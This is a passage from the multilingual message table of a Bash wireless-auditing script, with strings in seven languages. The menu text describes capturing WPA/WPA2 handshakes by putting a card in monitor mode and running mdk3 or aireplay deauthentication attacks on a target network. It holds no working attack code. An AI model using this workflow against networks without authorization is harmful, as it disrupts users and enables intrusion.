	arr["RUSSIAN",126]="У вас есть подходящая целевая сеть WPA/WPA2. Скрипт может продолжать..."
	arr["GREEK",126]="Έχετε επιλέξει ένα έγκυρο δίκτυο-στόχος WPA/WPA2. Το script μπορεί να συνεχίσει..."

	arr["ENGLISH",127]="The natural order to proceed in this menu is usually: 1-Select wifi card 2-Put it in monitor mode 3-Select target network 4-Capture Handshake"
	arr["SPANISH",127]="El orden natural para proceder en este menú suele ser: 1-Elige tarjeta wifi 2-Ponla en modo monitor 3-Elige red objetivo 4-Captura Handshake"
	arr["FRENCH",127]="La marche à suivre est généralement: 1-Selectionner la carte wifi 2-Activer le mode moniteur 3-Choisir un réseau cible 4-Capturer le Handshake"
	arr["CATALAN",127]="L'ordre natural per procedir a aquest menú sol ser: 1-Tria targeta wifi 2-Posa-la en mode monitor 3-Tria xarxa objectiu 4-Captura Handshake"
	arr["PORTUGUESE",127]="A ordem normal para esse menu é: 1-Escolha de uma interface wifi 2-colocar interface wifi no modo monitor 3-Selecionar uma rede 4-Capturar Handshake"
	arr["RUSSIAN",127]="Естественный порядок работы в этом меню: 1-Выбрать wifi карту 2-Перевести её в режим монитора 3-Выбрать целевую сеть 4-Захватить рукопожатие"
	arr["GREEK",127]="Η σειρά εντολών για να προχωρήσετε σε αυτό το μενού είναι συνήθως: 1-Επιλέξτε κάρτα wifi 2-Βάλτε την σε κατάσταση παρακολούθησης 3-Επιλέξτε δίκτυο-στόχος 4-Καταγράψτε την Χειραψία"

	arr["ENGLISH",128]="Select a wifi card to work in order to be able to do more actions than with an ethernet interface"
	arr["SPANISH",128]="Selecciona una interfaz wifi para poder realizar más acciones que con una interfaz ethernet"
	arr["FRENCH",128]="Veuillez sélectionner une carte wifi au lieu d'une carte ethernet afin d'être en mesure de réaliser plus d'actions"
	arr["CATALAN",128]="Seleccioneu una targeta wifi per treballar amb la finalitat de ser capaç de fer més accions que amb una interfície ethernet"
	arr["PORTUGUESE",128]="Selecione uma interface wifi para realizar mais ações do que com interface ethernet"
	arr["RUSSIAN",128]="Выберите wifi карту для работы, чтобы вы могли выполнить больше действий, чем с ethernet интерфейсом"
	arr["GREEK",128]="Επιλέξτε κάρτα wifi ώστε να μπορείτε να έχετε περισσοτερες επιλογές από μία διεπαφή ethernet"

	arr["ENGLISH",129]="The natural order to proceed in this menu is usually: 1-Select wifi card 2-Put it in monitor mode 3-Select target network 4-Start attack"
	arr["SPANISH",129]="El orden natural para proceder en este menú suele ser: 1-Elige tarjeta wifi 2-Ponla en modo monitor 3-Elige red objetivo 4-Comienza el ataque"
	arr["FRENCH",129]="La marche à suivre est généralement: 1-Selectionner la carte wifi 2-Activer le mode moniteur 3-Choisir un réseau cible 4-Capturer le Handshake"
	arr["CATALAN",129]="L'ordre natural per procedir a aquest menú sol ser: 1-Tria targeta wifi 2-Posa-la en mode monitor 3-Tria xarxa objectiu 4-Iniciar l'atac"
	arr["PORTUGUESE",129]="A ordem normal para esse menu é: 1-Escolha de uma interface wifi 2-colocar interface wifi no modo monitor 3-Selecionar uma rede 4-Começa o ataque"
	arr["RUSSIAN",129]="Обычный порядок работы в этом меню: 1-Выберите wifi карту 2-Переведите её в режим монитора 3-Выберите целевую сеть 4-Запустите атаку"
	arr["GREEK",129]="Η διαδικασία για να προχωρήσετε σε αυτό το μενού είναι συνήθως: 1-Επιλέξτε κάρτα wifi 2-Βάλτε την σε κατάσταση παρακολούθησης 3-Επιλέξτε δίκτυο-στόχος 4-Ξεκινήστε την επίθεση"

	arr["ENGLISH",130]="Remember to select a target network with clients to capture Handshake"
	arr["SPANISH",130]="Recuerda seleccionar una red objetivo con clientes para capturar el Handshake"
	arr["FRENCH",130]="Rappelez-vous de sélectionner un réseau cible avec un/des client(s) connecté(s) pour pouvoir capturer un Handshake"
	arr["CATALAN",130]="Recorda que has de seleccionar una xarxa de destinació amb clients per capturar el Handshake"
	arr["PORTUGUESE",130]="Lembre-se de selecionar uma com clientes para capturar o Handshake"
	arr["RUSSIAN",130]="Не забудьте выбрать целевую сеть с клиентами для захвата рукопожатия"
	arr["GREEK",130]="Θυμηθείτε να επιλέξετε ένα δίκτυο-στόχος με έναν ή παραπάνω χρήστες για να καταγράψετε μία Χειραψία"

	arr["ENGLISH",131]="Not all attacks affect all access points. If an attack is not working against an access point, choose another one :)"
	arr["SPANISH",131]="No todos los ataques afectan a todos los puntos de acceso. Si un ataque no funciona contra un punto de acceso, elige otro :)"
	arr["FRENCH",131]="Toutes les attaques n'affectent pas les points d'accès de la même manière. Si une attaque ne donne pas de résultats, choisissez en une autre :)"
	arr["CATALAN",131]="No tots els atacs afecten tots els punts d'accés. Si un atac no està treballant cap a un punt d'accés, tria un altre :)"
	arr["PORTUGUESE",131]="Nem todos os ataques funcionam em todas as redes. Se um ataque não funcionar contra uma rede, escolha outro :)"
	arr["RUSSIAN",131]="Не все атаки справляются со всеми точками доступа. Если атака не работает в отношении точки доступа, выберите другую :)"
	arr["GREEK",131]="Δεν είναι όλες οι επιθέσεις αποτελεσματικές σε όλα τα σημεία πρόσβασης. Αν μια επίθεση δεν δουλεύει ενάντια σε ένα σημείο πρόσβασης, διαλέξτε κάποια άλλη :)"

	arr["ENGLISH",132]="Cleaning a Handshake file is recommended only for big size files. It's better to have a backup, sometimes file can be corrupted while cleaning it"
	arr["SPANISH",132]="Limpiar un fichero de Handshake se recomienda solo para ficheros grandes. Es mejor hacer una copia de seguridad antes, a veces el fichero se puede corromper al limpiarlo"
	arr["FRENCH",132]="Épurer le fichier contenant le Handshake est seulement recommandable si le fichier est volumineux. Si vous décidez d'épurer le fichier il est conseillé de faire une copie de sauvegarde du fichier originel, l'opération de nettoyage comporte des risques et peut le rendre illisible"
	arr["CATALAN",132]="Netejar un fitxer de Handshake es recomana només per a fitxers grans. És millor fer una còpia de seguretat abans, de vegades el fitxer es pot corrompre al netejar-lo"
	arr["PORTUGUESE",132]="Limpar um Handshake é recomendado apenas para arquivos grandes. Melhor fazer um backup antes de otimizar o arquivo; as vezes pode corromper o arquivo ao limpar"
	arr["RUSSIAN",132]="Очистка файла рукопожатия рекомендована только для файлов больших размеров. Лучше иметь резервную копию, иногда во время очистки файл может быть повреждён"
	arr["GREEK",132]="Ο καθαρισμός ενός αρχείου Χειραψίας συνιστάται μόνο για μεγάλου μεγέθους αρχεία. Καλύτερα κρατήστε ένα backup, μερικές φορές το αρχείο μπορεί να καταστραφεί κατά τη διάρκεια του καθαρισμού"

	arr["ENGLISH",133]="If you select a target network with hidden ESSID, you can't use it, but you can perform BSSID based attacks to that network"
	arr["SPANISH",133]="Si seleccionas una red objetivo con el ESSID oculto, no podrás usarlo, pero puedes hacer ataques basados en BSSID sobre esa red"
	arr["FRENCH",133]="Si vous sélectionnez un réseau cible avec un ESSID caché, vous n'allez pas pouvoir utiliser l'ESSID pour attaquer, mais vous pourrez effectuer les attaques basées sur le BSSID du réseau"
	arr["CATALAN",133]="Si selecciones una xarxa objectiu amb el ESSID ocult, no podràs usar-lo, però pots fer atacs basats en BSSID sobre aquesta xarxa"
	arr["PORTUGUESE",133]="Se você selecionar uma rede com ESSID oculto, você não pode usá-lo, mas você pode fazer ataques com base no BSSID"
	arr["RUSSIAN",133]="Если вы выбрали целевую сеть со скрытым ESSID, вы не сможете использовать её, но вы можете выполнить атаку на эту сеть на основе BSSID"
	arr["GREEK",133]="Αν επιλέξετε ένα δίκτυο-στόχος με κρυφό ESSID, δεν μπορείτε να το χρησιμοποιήσετε, αλλά μπορείτε να εκτελέσετε επιθέσεις BSSID σε αυτό το δίκτυο"

	arr["ENGLISH",134]="If your Linux is a virtual machine, it is possible that integrated wifi cards are detected as ethernet. Use an external usb wifi card"
	arr["SPANISH",134]="Si tu Linux es una máquina virtual, es posible que las tarjetas wifi integradas sean detectadas como ethernet. Utiliza una tarjeta wifi externa usb"
	arr["FRENCH",134]="Si votre système d'exploitation Linux est lancé dans une machine virtuelle, il est probable que les cartes wifi internes soient détectées comme des cartes ethernet. Il vaut mieux dans ce cas utiliser un dispositif wifi usb"
	arr["CATALAN",134]="Si el teu Linux és a una màquina virtual, és possible que les targetes wifi integrades siguin detectades com ethernet. Utilitza una targeta wifi externa usb"
	arr["PORTUGUESE",134]="Se seu Linux é uma máquina virtual, suas placas wireless integradas são detectadas como ethernet. Use uma placa usb externa"
	arr["RUSSIAN",134]="Если ваш Linux в виртуально машине, то интегрированная wifi карта может определиться как Ethernet. Используйте внешнюю usb wifi карту"
	arr["GREEK",134]="Αν το Linux σας είναι εικονική μηχανή, είναι πιθανόν οι ενσωματωμένες κάρτες wifi να εντοπιστούν σαν ethernet. Χρησιμοποιήστε μία εξωτερική usb κάρτα wifi"

	arr["ENGLISH",135]="Type of encryption: ${pink_color}${enc}${normal_color}"
	arr["SPANISH",135]="Tipo de encriptado: ${pink_color}${enc}${normal_color}"
	arr["FRENCH",135]="Type de chiffrement: ${pink_color}${enc}${normal_color}"
	arr["CATALAN",135]="Tipus d'encriptat: ${pink_color}${enc}${normal_color}"
	arr["PORTUGUESE",135]="Tipo de criptografia: ${pink_color}${enc}${normal_color}"
	arr["RUSSIAN",135]="Тип шифрования: ${pink_color}${enc}${normal_color}"
	arr["GREEK",135]="Τύπος κρυπτογράφησης: ${pink_color}${enc}${normal_color}"

	arr["ENGLISH",136]="Obtaining a Handshake is only for networks with encryption WPA or WPA2"
	arr["SPANISH",136]="La obtención de un Handshake es solo para redes con encriptación WPA o WPA2"
	arr["FRENCH",136]="L'obtention d'un Handshake est seulement possible sur des réseaux protégés par chiffrement WPA ou WPA2"
	arr["CATALAN",136]="L'obtenció d'un Handshake és només per a xarxes amb encriptació WPA o WPA2"
	arr["PORTUGUESE",136]="A obtenção de um Handshake é somente para redes com criptografia WPA ou WPA2"
	arr["RUSSIAN",136]="Получение рукопожатия только для сетей с шифрованием WPA или WPA2"
	arr["GREEK",136]="Η απόκτηση μιας Χειραψίας ισχύει μόνο σε δίκτυα με κρυπτογράφηση WPA ή WPA2"

	arr["ENGLISH",137]="The selected network is invalid. To get a Handshake, encryption type of target network should be WPA or WPA2"
	arr["SPANISH",137]="La red seleccionada no es válida. Para obtener un Handshake, el tipo de encriptación de la red objetivo debe ser WPA o WPA2"
	arr["FRENCH",137]="Le réseau sélectionné est invalide . Pour obtenir un Handshake le réseau cible doit être en WPA ou WPA2"
	arr["CATALAN",137]="La xarxa seleccionada no és vàlida. Per obtenir un Handshake, el tipus d'encriptació de la xarxa objectiu ha de ser WPA o WPA2"
	arr["PORTUGUESE",137]="A rede selecionada é inválida. Para obter um Handshake, o tipo de criptografia da rede deve ser WPA ou WPA2"
	arr["RUSSIAN",137]="Выбранная сеть не подходит. Для получения рукопожатия, тип шифрования должен быть WPA или WPA2"
	arr["GREEK",137]="Το επιλεγμένο δίκτυο είναι άκυρο. Για να αποκτήσετε μία Χειραψία, ο τύπος κρυπτογράφησης του δικτύου-στόχου πρέπει να έιναι WPA ή WPA2"

	arr["ENGLISH",138]="Attack for Handshake"
	arr["SPANISH",138]="Ataque para Handshake"
	arr["FRENCH",138]="Attaque pour obtenir un Handshake"
	arr["CATALAN",138]="Atac de Handshake"
	arr["PORTUGUESE",138]="Ataque de Handshake"
	arr["RUSSIAN",138]="Атаковать для рукопожатия"
	arr["GREEK",138]="Επίθεση για Χειραψία"

	arr["ENGLISH",139]="1.  Deauth / disassoc amok mdk3 attack"
	arr["SPANISH",139]="1.  Ataque Deauth / Disassoc amok mdk3"
	arr["FRENCH",139]="1.  Attaque Deauth / Disassoc amok mdk3"
	arr["CATALAN",139]="1.  Atac Deauth / Disassoc amok mdk3"
	arr["PORTUGUESE",139]="1.  Ataque Deauth / Disassoc amok mdk3"
	arr["RUSSIAN",139]="1.  Атака деаутентификации / разъединения amok mdk3"
	arr["GREEK",139]="1.  Επίθεση Deauth / disassoc amok mdk3"

	arr["ENGLISH",140]="2.  Deauth aireplay attack"
	arr["SPANISH",140]="2.  Ataque Deauth aireplay"
	arr["FRENCH",140]="2.  Attaque Deauth aireplay"
	arr["CATALAN",140]="2.  Atac Deauth aireplay"
	arr["PORTUGUESE",140]="2.  Ataque Deauth aireplay"
	arr["RUSSIAN",140]="2.  Атака деаутентификации aireplay"
	arr["GREEK",140]="2.  Επίθεση Deauth aireplay"

	arr["ENGLISH",141]="3.  WIDS / WIPS / WDS Confusion attack"
	arr["SPANISH",141]="3.  Ataque WIDS / WIPS / WDS Confusion"
	arr["FRENCH",141]="3.  Attaque WIDS / WIPS / WDS Confusion"
	arr["CATALAN",141]="3.  Atac WIDS / WIPS / WDS Confusion"
	arr["PORTUGUESE",141]="3.  Ataque WIDS / WIPS / Confusão WDS"
	arr["RUSSIAN",141]="3.  Атака смешения WIDS / WIPS / WDS"
	arr["GREEK",141]="3.  Επίθεση σύγχυσης WIDS / WIPS / WDS"

	arr["ENGLISH",142]="If the Handshake doesn't appear after an attack, try again or change the type of attack"
	arr["SPANISH",142]="Si tras un ataque el Handshake no aparece, vuelve a intentarlo o cambia de ataque hasta conseguirlo"
	arr["FRENCH",142]="Si vous n'obtenez pas le Handshake après une attaque, veuillez recommencer ou bien changer d'attaque jusqu'à son obtention"
	arr["CATALAN",142]="Si després d'un atac el Handshake no apareix, torna a intentar-ho o canvia d'atac fins aconseguir-ho"
	arr["PORTUGUESE",142]="Se o Handshake não aparecer após um ataque, tente novamente ou tente alterar o tipo de ataque"
	arr["RUSSIAN",142]="Если рукопожатие не появилось после атаки, попробуйте снова или измените тип атаки"
	arr["GREEK",142]="Αν η Χειραψία δεν εμφανιστεί μετά από την επίθεση, προσπαθήστε ξανά ή αλλάξτε τύπο επίθεσης"

	arr["ENGLISH",143]="Two windows will be opened. One with the Handshake capturer and other with the attack to force clients to reconnect"
	arr["SPANISH",143]="Se abrirán dos ventanas. Una con el capturador del Handshake y otra con el ataque para expulsar a los clientes y forzarles a reconectar"
	arr["FRENCH",143]="Deux fenêtres vont s'ouvrir: La première pour capturer le handshake et la deuxième pour effectuer l'attaque visant à expulser les clients du réseau et les forcer à renégocier un Handshake pour se reconnecter"
	arr["CATALAN",143]="S'obriran dues finestres. Una amb el capturador de Handshake i una altra amb l'atac per expulsar als clients i forçar-los a reconnectar"
	arr["PORTUGUESE",143]="Duas janelas serão abertas. Uma para captura do Handshake e outra com o ataque para forçar os clientes a se reconectarem"
	arr["RUSSIAN",143]="Будут открыты два окна. Одно с захватчиком рукопожатия, а другое с атакой для принудительного переподключения клиентов"
	arr["GREEK",143]="Θα ανοίξουν δύο παράθυρα. Ένα με τον καταγραφέα Χειραψίας, και ένα με την επίθεση εξαναγκασμένης επανασύνδεσης των χρηστών"

	arr["ENGLISH",144]="Don't close any window manually, script will do when needed. In about 20 seconds maximum you'll know if you've got the Handshake"
	arr["SPANISH",144]="No cierres manualmente ninguna ventana, el script lo hará cuando proceda. En unos 20 segundos como máximo sabrás si conseguiste el Handshake"
	arr["FRENCH",144]="Ne pas fermer une des fenêtres manuellement:  Le script va le faire automatiquement si besoin est. Vos saurez dans tout a plus 20 secondes si avez obtenu le Handshake"
	arr["CATALAN",144]="No tanquis manualment cap finestra, el script ho farà quan escaigui. En uns 20 segons com a màxim sabràs si vas aconseguir el Handshake"
	arr["PORTUGUESE",144]="Não feche nenhuma janela manualmente, o script fechara quando necessário. Em cerca de 20 segundos no máximo você vai saber se você tem o Handshake"
	arr["RUSSIAN",144]="Не закрывайте вручную какое-либо окно, скрипт сделает это когда нужно. Примерно в максимум 20 секунд вы узнаете, получили ли вы рукопожатие"
	arr["GREEK",144]="Μην επιχειρήσετε το κλείσιμο κάποιου παραθύρου χειροκίνητα, εάν χρειαστεί το script θα το κάνει μόνο του. Σε περίπου 20 δευτερόλεπτα το μέγιστο θα μάθετε αν αποκτήσατε την Χειραψία"

	arr["ENGLISH",145]="Did you get the Handshake? ${pink_color}(Look at the top right corner of the capture window) ${normal_color}[y/n]"
	arr["SPANISH",145]="¿Conseguiste el Handshake? ${pink_color}(Mira en la parte superior derecha de la ventana de captura) ${normal_color}[y/n]"
	arr["FRENCH",145]="Avez-vous obtenu le Handshake? ${pink_color}(Regardez dans le coin supérieur en haut à droite de la fenêtre de capture) ${normal_color}[y/n]"
	arr["CATALAN",145]="¿Has aconseguit el Handshake? ${pink_color}(Mira a la part superior dreta de la finestra de captura) ${normal_color}[y/n]"
	arr["PORTUGUESE",145]="O Handshake foi obtido? ${pink_color}(Olhe para o canto superior direito da janela de captura) ${normal_color}[y/n]"
	arr["RUSSIAN",145]="Вы получили рукопожатие? ${pink_color}(Смотрите на верхний правый угол окна захвата) ${normal_color}[y/n]"
	arr["GREEK",145]="Πήρατε την Χειραψία; ${pink_color}(Κοιτάξτε στη πάνω δεξιά γωνία του παραθύρου) ${normal_color}[y/n]"

	arr["ENGLISH",146]="It seems we failed... try it again or choose another attack"
	arr["SPANISH",146]="Parece que no lo hemos conseguido... inténtalo de nuevo o elige otro ataque"
	arr["FRENCH",146]="Il semble que c'est un échec... Essayez à nouveau ou choisissez une autre attaque"
	arr["CATALAN",146]="Sembla que no ho hem aconseguit... intenta-ho de nou o tria un altre atac"
	arr["PORTUGUESE",146]="Parece que nos falhamos... tente novamente ou escolha outro ataque"
	arr["RUSSIAN",146]="Кажется мы потерпели неудачу... попробуйте снова или выберите другую атаку"
	arr["GREEK",146]="Φαίνεται πως αποτύχαμε... προσπαθήστε ξανά ή επιλέξτε άλλη επίθεση"

	arr["ENGLISH",147]="4.  Return to Handshake tools menu"
	arr["SPANISH",147]="4.  Volver al menú de herramientas Handshake"
	arr["FRENCH",147]="4.  Retourner au menu des outils pour la capture du handshake"
	arr["CATALAN",147]="4.  Tornar al menú d'eines Handshake"
	arr["PORTUGUESE",147]="4.  Voltar para o menu de ferramentas Handshake"
	arr["RUSSIAN",147]="4.  Возврат в меню инструментов для работы с рукопожатием"
	arr["GREEK",147]="4.  Επιστροφή στο μενού με τα εργαλεία Χειραψίας"

	arr["ENGLISH",148]="Type the path to store the file or press [Enter] to accept the default proposal ${normal_color}[${handshakepath}]"
	arr["SPANISH",148]="Escribe la ruta donde guardaremos el fichero o pulsa [Enter] para aceptar la propuesta por defecto ${normal_color}[${handshakepath}]"
	arr["FRENCH",148]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur [Entrée] pour prendre le chemin proposé par défaut ${normal_color}[${handshakepath}]"
	arr["CATALAN",148]="Escriu la ruta on guardarem el fitxer o prem [Enter] per acceptar la proposta per defecte ${normal_color}[${handshakepath}]"
	arr["PORTUGUESE",148]="Digite o caminho para salvar o arquivo ou pressione [Enter] para o caminho padrão ${normal_color}[${handshakepath}]"
	arr["RUSSIAN",148]="Напечатайте путь, по которому сохранить файл или нажмите [Enter] для принятия предложения по умолчанию ${normal_color}[${handshakepath}]"
	arr["GREEK",148]="Πληκτρολογήστε το μονοπάτι για την αποθήκευση του αρχείου ή πατήστε [Enter] για την προεπιλεγμένη επιλογή ${normal_color}[${handshakepath}]"

	arr["ENGLISH",149]="Handshake file generated successfully at [${normal_color}${enteredpath}${blue_color}]"
	arr["SPANISH",149]="Fichero de Handshake generado con éxito en [${normal_color}${enteredpath}${blue_color}]"
	arr["FRENCH",149]="Fichier Handshake généré avec succès dans [${normal_color}${enteredpath}${blue_color}]"
	arr["CATALAN",149]="Fitxer de Handshake generat amb èxit a [${normal_color}${enteredpath}${blue_color}]"
	arr["PORTUGUESE",149]="Arquivo Handshake gerado com sucesso [${normal_color}${enteredpath}${blue_color}]"
	arr["RUSSIAN",149]="Файл рукопожатия успешно сгенерирован в [${normal_color}${enteredpath}${blue_color}]"
	arr["GREEK",149]="Το αρχείο Χειραψίας δημιουργήθηκε επιτυχώς στο [${normal_color}${enteredpath}${blue_color}]"

	arr["ENGLISH",150]="No captured Handshake file detected during this session..."
	arr["SPANISH",150]="No se ha detectado ningún fichero de Handshake capturado en esta sesión..."
	arr["FRENCH",150]="Aucun fichier Handshake valide détecté durant cette session..."
	arr["CATALAN",150]="No s'ha detectat un fitxer de Handshake capturat en aquesta sessió..."
	arr["PORTUGUESE",150]="Nenhum Handshake capturado nessa seção..."
	arr["RUSSIAN",150]="За эту сессию не обнаружено захваченного рукопожатия..."
	arr["GREEK",150]="Δεν εντοπίστηκε κάποιο αρχείο καταγραφής Χειραψίας κατά τη διάρκεια της συνεδρίας..."

	arr["ENGLISH",151]="Handshake captured file detected during this session [${normal_color}${enteredpath}${blue_color}]"
	arr["SPANISH",151]="Se ha detectado un fichero de Handshake capturado en esta sesión [${normal_color}${enteredpath}${blue_color}]"
	arr["FRENCH",151]="Un fichier contenant un Handshake a été détecté pour la session effectuée et se trouve dans ${normal_color}${enteredpath}${blue_color}]"
	arr["CATALAN",151]="S'ha detectat un fitxer de Handshake capturat en aquesta sessió [${normal_color}${enteredpath}${blue_color}]"
	arr["PORTUGUESE",151]="Handshake capturado com sucesso [${normal_color}${enteredpath}${blue_color}]"
	arr["RUSSIAN",151]="В этой сессии обнаружен файл с захваченным рукопожатием [${normal_color}${enteredpath}${blue_color}]"
	arr["GREEK",151]="Εντοπίστηκε αρχείο καταγραφής Χειραψίας κατά τη διάρκεια της συνεδρίας [${normal_color}${enteredpath}${blue_color}]"

	arr["ENGLISH",152]="Do you want to clean/optimize the Handshake captured file during this session? ${normal_color}[y/n]"
	arr["SPANISH",152]="¿Quieres limpiar/optimizar el fichero de Handshake capturado en esta sesión? ${normal_color}[y/n]"
	arr["FRENCH",152]="Voulez-vous nettoyer/optimiser le fichier Handshake capturé pendant cette session? ${normal_color}[y/n]"
	arr["CATALAN",152]="¿Vols netejar/optimitzar el fitxer de Handshake capturat en aquesta sessió? ${normal_color}[y/n]"
	arr["PORTUGUESE",152]="Quer limpar/otimizar o arquivo handshake capturado nesta sessão? ${normal_color}[y/n]"
	arr["RUSSIAN",152]="Вы хотите очистить/оптимизировать захваченный за эту сессию файл рукопожания? ${normal_color}[y/n]"
	arr["GREEK",152]="Θέλετε να καθαρίσετε/βελτιστοποιήσετε το αρχείο καταγραφής Χειραψίας της συνεδρίας; ${normal_color}[y/n]"

	arr["ENGLISH",153]="File cleaned/optimized successfully"
	arr["SPANISH",153]="Fichero limpiado/optimizado con éxito"
	arr["FRENCH",153]="Fichier lavé/optimisé avec succès"
	arr["CATALAN",153]="Fitxer netejat/optimitzat amb èxit"
	arr["PORTUGUESE",153]="Arquivo limpo/otimizado com sucesso"
	arr["RUSSIAN",153]="Файл успешно очищен/оптимизирован"
	arr["GREEK",153]="Το αρχείο καθαρίστηκε/βελτιστοποιήθηκε επιτυχώς"

	arr["ENGLISH",154]="Set path to file :"
	arr["SPANISH",154]="Introduce la ruta al fichero :"
	arr["FRENCH",154]="Entrez le chemin vers le fichier :"
	arr["CATALAN",154]="Introdueix la ruta al fitxer :"
	arr["PORTUGUESE",154]="Digite o caminho para o arquivo :"
	arr["RUSSIAN",154]="Установить путь до файла :"
	arr["GREEK",154]="Θέστε μονοπάτι για το αρχείο :"

	arr["ENGLISH",155]="The directory exists but you didn't specify filename. It will be autogenerated [${normal_color}${suggested_filename}${yellow_color}]"
	arr["SPANISH",155]="El directorio existe pero no se especificó nombre de fichero. Se autogenerará [${normal_color}${suggested_filename}${yellow_color}]"
	arr["FRENCH",155]="Le dossier existe mais sans qu'aucun nom pour le fichier soit précisé. Il sera donc appelé [${normal_color}${suggested_filename}${yellow_color}]"
	arr["CATALAN",155]="El directori existeix però no s'ha especificat nom de fitxer. Es autogenerará [${normal_color}${suggested_filename}${yellow_color}]"
	arr["PORTUGUESE",155]="O diretório existe, mas o  nome do arquivo não foi especificado. Será gerado automaticamente [${normal_color}${suggested_filename}${yellow_color}]"
	arr["RUSSIAN",155]="Директория существует, но вы не указали имя файла. Оно будет сгенерировано автоматически [${normal_color}${suggested_filename}${yellow_color}]"
	arr["GREEK",155]="Ο κατάλογος υπάρχει αλλά δεν έχετε προσδιορίσει το όνομα του αρχείου [${normal_color}${suggested_filename}${yellow_color}]"

	arr["ENGLISH",156]="Directory not exists"
	arr["SPANISH",156]="El directorio no existe"
	arr["FRENCH",156]="Le dossier n'existe pas"
	arr["CATALAN",156]="El directori no existeix"
	arr["PORTUGUESE",156]="O diretório não existe"
	arr["RUSSIAN",156]="Директория не существует"
	arr["GREEK",156]="Ο κατάλογος δεν υπάρχει"

	arr["ENGLISH",157]="The path exists but you don't have write permissions"
	arr["SPANISH",157]="La ruta existe pero no tienes permisos de escritura"
	arr["FRENCH",157]="Le chemin existe mais vous ne disposez pas des permis d'écriture"
	arr["CATALAN",157]="La ruta existeix, però no tens permisos d'escriptura"
	arr["PORTUGUESE",157]="O diretório existe, mas você não tem permissões de gravação"
	arr["RUSSIAN",157]="Путь существует, но у вас нет прав на запись"
	arr["GREEK",157]="Το μονοπάτι υπάρχει, αλλά δεν έχετε δικαιώματα εγγραφής"

	arr["ENGLISH",158]="The path is valid and you have write permissions. Script can continue..."
	arr["SPANISH",158]="La ruta es válida y tienes permisos de escritura. El script puede continuar..."
	arr["FRENCH",158]="Le chemin est valide et vous disposez des privilèges nécessaires pour l'écriture. Le script peut continuer..."
	arr["CATALAN",158]="La ruta és vàlida i tens permisos d'escriptura. El script pot continuar..."
	arr["PORTUGUESE",158]="O diretório é válido e você tem permissões de gravação. O script pode continuar..."
	arr["RUSSIAN",158]="Путь существует и у вас есть права на запись. Скрипт может продолжить..."
	arr["GREEK",158]="Το μονοπάτι είναι έγκυρο και έχετε δικαιώματα εγγραφής. Το script μπορεί να συνεχίσει..."

	arr["ENGLISH",159]="The file doesn't need to be cleaned/optimized"
	arr["SPANISH",159]="El fichero no necesita ser limpiado/optimizado"
	arr["FRENCH",159]="Le fichier n'a pas besoin d'être nettoyé/optimisé"
	arr["CATALAN",159]="El fitxer no necessita ser netejat/optimitzat"
	arr["PORTUGUESE",159]="O arquivo não precisa ser limpos/otimizado"
	arr["RUSSIAN",159]="Файлу не требуется очистка/оптимизация"
	arr["GREEK",159]="Το αρχείο δεν χρειάζεται να καθαριστεί/βελτιστοποιηθεί"

	arr["ENGLISH",160]="No tasks to perform on exit"
	arr["SPANISH",160]="No hay que realizar ninguna tarea a la salida"
	arr["FRENCH",160]="Aucune opération n'est planifiée pour l’arrêt du script"
	arr["CATALAN",160]="No cal fer cap tasca a la sortida"
	arr["PORTUGUESE",160]="Não há tarefas a serem executadas na saída"
	arr["RUSSIAN",160]="Нет задач для выполнения перед выходом"
	arr["GREEK",160]="Δεν απομένει κάποιο task για να εκτελεστεί στην έξοδο"

	arr["ENGLISH",161]="File not exists"
	arr["SPANISH",161]="El fichero no existe"
	arr["FRENCH",161]="Le fichier n' existe pas"
	arr["CATALAN",161]="El fitxer no existeix"
	arr["PORTUGUESE",161]="O arquivo não existe"
	arr["RUSSIAN",161]="Файл не существует"
	arr["GREEK",161]="Το αρχείο δεν υπάρχει"

	arr["ENGLISH",162]="Congratulations!!"
	arr["SPANISH",162]="Enhorabuena!!"
	arr["FRENCH",162]="Félicitations!!"
	arr["CATALAN",162]="Enhorabona!!"
	arr["PORTUGUESE",162]="Parabéns!!"
	arr["RUSSIAN",162]="Поздравления!!"
	arr["GREEK",162]="Συγχαρητήρια!!"

	arr["ENGLISH",163]="It is recommended to launch the script as root user or using \"sudo\". Make sure you have permission to launch commands like rfkill or airmon for example"
	arr["SPANISH",163]="Se recomienda lanzar el script como usuario root o usando \"sudo\". Asegúrate de tener permisos para lanzar comandos como rfkill o airmon por ejemplo"
	arr["FRENCH",163]="Il faut lancer le script en tant que root ou en utilisant \"sudo\". Assurez-vous de bien dsiposer des privilèges nécessaires à l’exécution de commandes comme rfkill ou airmon"
	arr["CATALAN",163]="Es recomana llançar l'script com a usuari root o utilitzeu \"sudo\". Assegura't de tenir permisos per llançar ordres com rfkill o airmon per exemple"
	arr["PORTUGUESE",163]="Recomenda-se iniciar o script como root ou usando \"sudo\". Certifique-se de que você tem permissão para iniciar comandos como por exemplo rfkill ou airmon"
	arr["RUSSIAN",163]="Рекомендуется запускать скрипт от пользователя root или использовать \"sudo\". Убедитесь, что обладаете, к примеру, правами на запуск программ вроде rfkill или airmon"
	arr["GREEK",163]="Συνιστάται να εκτελέσετε το script ως χρήστης root ή να χρησιμοποιήσετε \"sudo\". Βεβαιωθείτε πως έχετε δικαίωμα να εκτελέσετε εντολές όπως rfkill ή airmon για παράδειγμα"

	arr["ENGLISH",164]="Cleaning temp files"
	arr["SPANISH",164]="Limpiando archivos temporales"
	arr["FRENCH",164]="Effacement des fichiers temporaires"
	arr["CATALAN",164]="Netejant arxius temporals"
	arr["PORTUGUESE",164]="Limpando arquivos temporários"
	arr["RUSSIAN",164]="Очистка временных файлов"
	arr["GREEK",164]="Γίνεται καθαρισμός προσωρινών αρχείων"

	arr["ENGLISH",165]="Checking if cleaning/restoring tasks are needed..."
	arr["SPANISH",165]="Comprobando si hay que realizar tareas de limpieza/restauración..."
	arr["FRENCH",165]="Vérification de la nécessité d'effectuer ou pas des opérations de nettoyage/restauration..."
	arr["CATALAN",165]="Comprovant si cal realitzar tasques de neteja/restauració..."
	arr["PORTUGUESE",165]="Verificando se é necessário executar tarefas de limpeza/restauração..."
	arr["RUSSIAN",165]="Проверка, нужны ли задачи по очистке/восстановлению..."
	arr["GREEK",165]="Γίνεται έλεγχος αν χρειάζονται tasks καθαρισμού/αποκατάστασης..."

	arr["ENGLISH",166]="Do you want to preserve monitor mode for your card on exit? ${normal_color}[y/n]"
	arr["SPANISH",166]="¿Deseas conservar el modo monitor de tu interfaz al salir? ${normal_color}[y/n]"
	arr["FRENCH",166]="Voulez-vous laisser votre interface en mode moniteur après l'arrêt du script? ${normal_color}[y/n]"
	arr["CATALAN",166]="¿Vols conservar el mode monitor de la teva interfície en sortir? ${normal_color}[y/n]"
